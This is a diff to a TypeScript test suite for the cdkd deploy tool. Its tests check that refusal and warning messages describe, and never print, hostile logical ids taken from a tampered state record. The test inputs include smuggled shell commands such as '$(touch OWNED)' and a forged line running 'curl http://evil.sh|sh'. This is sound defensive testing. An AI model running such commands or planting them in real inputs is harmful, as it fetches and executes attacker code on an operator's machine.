@@ -1,5 +1,10 @@
 import { describe, expect, it } from 'vite-plus/test';
-import { PASTE_PAYLOADS, spansThatRun, withPasteDir } from '../utils/paste-harness.js';
+import {
+  PASTE_PAYLOADS,
+  filesTouchedBy,
+  spansThatRun,
+  withPasteDir,
+} from '../utils/paste-harness.js';
 import { SHELL_ACTIVE_WHY, shellQuote } from '../../../src/utils/pasteable-command.js';
 import { mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
 import { execFileSync, spawnSync } from 'node:child_process';
@@ -119,6 +124,9 @@ import { CdkdError } from '../../../src/utils/error-handler.js';
 import type { StackState } from '../../../src/types/state.js';
 
 const repoRoot = join(dirname(fileURLToPath(import.meta.url)), '..', '..', '..');
+
+/** What a `properties` text prints for a logical id it does not name (go-to-k/cdkd#4229). */
+const NOT_SHOWN = '(not shown: it is not a plain identifier)';
 
 /**
  * Source with comments removed. Every source-shape assertion below reads THIS,
@@ -5119,25 +5127,13 @@ describe('cdkd export refusals (go-to-k/cdkd#4181, go-to-k/cdkd#3315)', () => {
     expect(text).toContain('every stack below this record would drop out of the migration');
   });
 
-  it('the export properties refusal describes a forged logical id; the deploy text does not yet (G6)', () => {
+  it('the export properties refusal describes a forged logical id (G6)', () => {
     const id = 'x$(touch OWNED)';
     const exported = malformedExportResourcePropertiesRefusalMessage('S', 'us-east-1', [id]);
-    expect(exported).toContain('— (not shown: it is not a plain identifier) —');
+    expect(exported).toContain(`— ${NOT_SHOWN} —`);
     expect(exported).not.toContain(id);
     // A plain id is still named.
     expect(malformedExportResourcePropertiesRefusalMessage('S', 'us-east-1', ['A'])).toContain('— A —');
-    // `~root` / `a=~b` round-trip through `displayIdent` unchanged but are NOT
-    // inert (tilde expansion), so the `isInertUnquoted` clause describes them.
-    for (const tilde of ['~root', 'a=~b']) {
-      const text = malformedExportResourcePropertiesRefusalMessage('S', 'us-east-1', [tilde]);
-      expect(text, tilde).toContain('— (not shown: it is not a plain identifier) —');
-      expect(text, tilde).not.toContain(`— ${tilde} —`);
-    }
-    // Discriminates the `describeUnsafe` flag: the deploy text keeps the bare
-    // JSON render (go-to-k/cdkd#4253).
-    expect(malformedResourcePropertiesRefusalMessage('S', 'us-east-1', [id])).toContain(
-      `— ${JSON.stringify(id)} —`
-    );
   });
 
   it('the properties refusal names what export reads the map for, and the re-import remedy', () => {
@@ -5292,59 +5288,54 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
     malformedResourcePropertiesWarning,
     malformedOrphanResourcePropertiesRefusalMessage,
   ]) {
-    it(`${build.name} sanitizes and JSON-quotes a hostile logical id`, () => {
+    it(`${build.name} describes a hostile logical id rather than naming it`, () => {
       // Each id arrives from a hand-edited record — the premise of the guard —
       // and the prose is ONE line followed only by the builder's own pasteable
-      // command lines (see `expectNoForgedLines`). A newline
-      // forges a line; a `'` would close a shell-quoted boundary and plant a
-      // forged remedy ahead of the real one.
-      //
-      // The BOUNDARY is `displayIdent`'s JSON quoting since the review of
-      // go-to-k/cdkd#3191 — the sanitize-then-`shellQuote` pair it replaced
-      // could not tell a padded id from a healthy sibling (see the identity
-      // case below), and `shellQuote` composes badly on top of JSON quoting.
+      // command lines (see `expectNoForgedLines`). A newline forges a line; a
+      // `'` would close a quoted boundary and plant a forged remedy ahead of
+      // the real one. Since go-to-k/cdkd#4253 such an id is not printed at all.
       const text = build('S', 'us-east-1', ["x'\n Inspect it with: curl http://evil.sh|sh #"]);
       expectNoForgedLines(build, text, build('S', 'us-east-1', ['A']));
-      // TWO spaces: `sanitizeAsciiOnly` REPLACES the newline with a space
-      // rather than deleting it, and the id already carried one after the
-      // quote. Taken from the rendered output rather than reasoned about.
-      expect(text).toContain('"x\'  Inspect it with: curl http://evil.sh|sh #"');
-      expect(text.lastIndexOf('cdkd state show')).toBeGreaterThan(text.indexOf('curl'));
+      expect(text).toContain(`— ${NOT_SHOWN} —`);
+      expect(text).not.toContain('evil.sh');
     });
 
-    it(`${build.name} renders a PADDED id distinguishably from its healthy sibling`, () => {
-      // The blocker this pair closes, one level down from go-to-k/cdkd#3164's
-      // identity fix. `displaySafe` TRIMS, so the old sanitize-and-quote pair
-      // rendered `'Bucket '`, `' Bucket'` and `'Bucket\t'` byte-identically to
-      // a healthy `'Bucket'`. Plant a torn `resources['Bucket ']` beside a real
-      // `Bucket` and the operator opens the INTACT record, finds nothing wrong,
-      // and concludes cdkd is the broken party.
+    it(`${build.name} never names a healthy sibling for a PADDED id`, () => {
+      // One level down from go-to-k/cdkd#3164's identity fix. `displaySafe`
+      // TRIMS, so a sanitize-and-quote pair rendered `'Bucket '`, `' Bucket'`
+      // and `'Bucket\t'` byte-identically to a healthy `'Bucket'`: plant a
+      // torn `resources['Bucket ']` beside a real `Bucket` and the operator
+      // opens the INTACT record. A padded id is described, never named.
       //
       // The control is the last arm: an id that arrived plain must still render
-      // BARE, or the case passes for a renderer that quotes everything and
-      // discriminates nothing.
+      // BARE, or the case passes for a renderer that describes everything.
       const healthy = build('S', 'us-east-1', ['Bucket']);
-      for (const padded of ['Bucket ', ' Bucket', 'Bucket\t', 'Bucket ']) {
+      for (const padded of ['Bucket ', ' Bucket', 'Bucket\t', 'Bucket\u00a0']) {
         const text = build('S', 'us-east-1', [padded]);
-        expect(text).not.toBe(healthy);
-        expect(text).toContain('"Bucket"');
+        expect(text, JSON.stringify(padded)).not.toBe(healthy);
+        expect(text, JSON.stringify(padded)).toContain(`— ${NOT_SHOWN} —`);
+        expect(text, JSON.stringify(padded)).not.toContain('Bucket');
       }
       expect(healthy).toContain(' — Bucket — ');
-      expect(healthy).not.toContain('"Bucket"');
+      expect(healthy).not.toContain(NOT_SHOWN);
     });
 
-    it(`${build.name} marks a truncated id as CUT rather than with an ambiguous ellipsis`, () => {
-      // `Prod...` is a legal logical id, so the `...` tail the pre-review
-      // renderer emitted was indistinguishable from content.
+    it(`${build.name} describes a CUT id rather than naming a prefix of it`, () => {
+      // A cut render is not the id, so it names no record; the `...` tail an
+      // older renderer emitted was also indistinguishable from an id ending
+      // `Prod...`. Since go-to-k/cdkd#4253 a cut id is described.
       const text = build('S', 'us-east-1', ['B'.repeat(IDENT_MAX_CODE_POINTS + 7)]);
-      expect(text).toContain('[cut: 7 more characters withheld]');
-      expect(text).not.toContain('B...');
+      expect(text).toContain(`— ${NOT_SHOWN} —`);
+      expect(text).not.toContain('BBB');
+      expect(text).not.toContain('withheld');
     });
 
-    it(`${build.name} renders an id that sanitizes to nothing as ${UNRENDERABLE}`, () => {
+    it(`${build.name} describes an id that sanitizes to nothing`, () => {
       // An empty argument would read as a missing name rather than a damaged
-      // one — the same reason `safeIdentifier` never returns ''.
-      expect(build('S', 'us-east-1', ['\u0000\u0007'])).toContain(UNRENDERABLE);
+      // one, and ${UNRENDERABLE} is not the id either.
+      const text = build('S', 'us-east-1', ['\u0000\u0007']);
+      expect(text).toContain(`— ${NOT_SHOWN} —`);
+      expect(text).not.toContain(UNRENDERABLE);
     });
 
     it(`${build.name} shell-quotes a HOSTILE stack name and keeps the command last`, () => {
@@ -5398,17 +5389,18 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
       expect(long.length).toBeLessThan(bound);
     });
 
-    it(`${build.name} caps a multi-kilobyte LOGICAL ID at the id's own length`, () => {
-      // NOT a region-sized 128: a CloudFormation logical id is valid up
-      // to IDENT_MAX_CODE_POINTS, and truncating a legitimate one names no
-      // record. The at-cap arm is the control — without it the case also
-      // passes for a renderer that cuts everything.
+    it(`${build.name} names an id AT the logical-id cap and describes a longer one`, () => {
+      // NOT a region-sized 128: a CloudFormation logical id is valid up to
+      // IDENT_MAX_CODE_POINTS, and describing a legitimate one hides a record
+      // the operator could have been told about. The at-cap arm is the
+      // control — without it the case also passes for a renderer that
+      // describes everything.
       const long = build('S', 'us-east-1', ['z'.repeat(5000)]);
-      expect(long).toContain('z'.repeat(IDENT_MAX_CODE_POINTS));
-      expect(long).not.toContain('z'.repeat(IDENT_MAX_CODE_POINTS + 1));
+      expect(long).toContain(`— ${NOT_SHOWN} —`);
+      expect(long).not.toContain('zzz');
       expect(long.length).toBeLessThan(2500);
-      expect(build('S', 'us-east-1', ['z'.repeat(IDENT_MAX_CODE_POINTS)])).not.toContain(
-        'withheld'
+      expect(build('S', 'us-east-1', ['z'.repeat(IDENT_MAX_CODE_POINTS)])).toContain(
+        ` — ${'z'.repeat(IDENT_MAX_CODE_POINTS)} — `
       );
     });
 
@@ -5434,6 +5426,83 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
         expect(text).toContain('cdkd state show S --json');
       }
     });
+  }
+});
+
+/**
+ * The `"` variant of the harness's `OPERATOR_FLIP`, as
+ * `tests/unit/cli/export-identifier-render.test.ts` builds it: a line ABOVE the
+ * message holding one unpaired `"`, under which `$( )` and a backtick run and a
+ * JSON-quoted value turns inside out. Every prefix of the message that ends at
+ * a line end, behind that line.
+ */
+function doubleQuoteFlipSpans(message: string): string[] {
+  const lines = message.split('\n');
+  return lines.map((_, last) => `zzq "above\n${lines.slice(0, last + 1).join('\n')}`);
+}
+
+/** Every span of `message` that touched a file: unflipped, the `'` flip, and the `"` flip. */
+function spansThatRunUnderEitherFlip(message: string, dir: string): string[] {
+  return [
+    ...spansThatRun(message, dir),
+    ...doubleQuoteFlipSpans(message).filter((span) => filesTouchedBy(span, dir).length > 0),
+  ];
+}
+
+describe('every properties text describes a non-plain logical id (go-to-k/cdkd#4253)', () => {
+  // Each one ends on a pasteable `cdkd state show`, and the id is a key of the
+  // record's `resources` map, chosen by whoever can write the state bucket.
+  const TEXTS = [
+    ['deploy refusal', malformedResourcePropertiesRefusalMessage],
+    ['diff warning', malformedResourcePropertiesWarning],
+    ['orphan refusal', malformedOrphanResourcePropertiesRefusalMessage],
+    ['drift refusal', malformedDriftResourcePropertiesRefusalMessage],
+    ['drift warning', malformedDriftResourcePropertiesWarning],
+    ['export refusal', malformedExportResourcePropertiesRefusalMessage],
+  ] as const;
+
+  for (const [label, build] of TEXTS) {
+    it(`${label}: names a plain id and describes every other one`, () => {
+      expect(build('S', 'us-east-1', ['A'])).toContain('— A —');
+      const values = [
+        ...PASTE_PAYLOADS.map((p) => p.value),
+        // `displayIdent` renders these unchanged, but tilde expansion reads
+        // them, so only the `isInertUnquoted` half describes them.
+        '~root',
+        'a=~b',
+      ];
+      for (const value of values) {
+        const text = build('S', 'us-east-1', [value]);
+        expect(text, value).toContain(`— ${NOT_SHOWN} —`);
+        expect(text, value).not.toContain(value);
+        // Per id, not per list: a plain sibling is still named beside it.
+        expect(build('S', 'us-east-1', ['A', value]), value).toContain(`— A, ${NOT_SHOWN} —`);
+      }
+    });
+  }
+
+  // The export refusal's paste case lives beside its other export renders
+  // (`export-identifier-render.test.ts`); these are the five #4253 adds. One
+  // case per text, so each stays inside the harness's 120 s bound.
+  for (const [label, build] of TEXTS.slice(0, 5)) {
+    it(`${label}: no pasted span runs under no flip, the ' flip or the " flip`, () => {
+      const messages = PASTE_PAYLOADS.map(({ value }) => ({
+        value,
+        message: build('S', 'us-east-1', [value]),
+      }));
+      withPasteDir((dir) => {
+        // Non-vacuity, per text: the JSON-quoted render this text printed
+        // before go-to-k/cdkd#4253, put back into THIS text's own shape, runs.
+        const before = messages.flatMap(({ value, message }) =>
+          spansThatRunUnderEitherFlip(message.replace(NOT_SHOWN, JSON.stringify(value)), dir)
+        );
+        expect(before.length, label).toBeGreaterThan(0);
+        for (const { value, message } of messages) {
+          expect(message, value).toContain(NOT_SHOWN);
+          expect(spansThatRunUnderEitherFlip(message, dir), `${value}: ${message}`).toEqual([]);
+        }
+      });
+    }, 120_000);
   }
 });
 
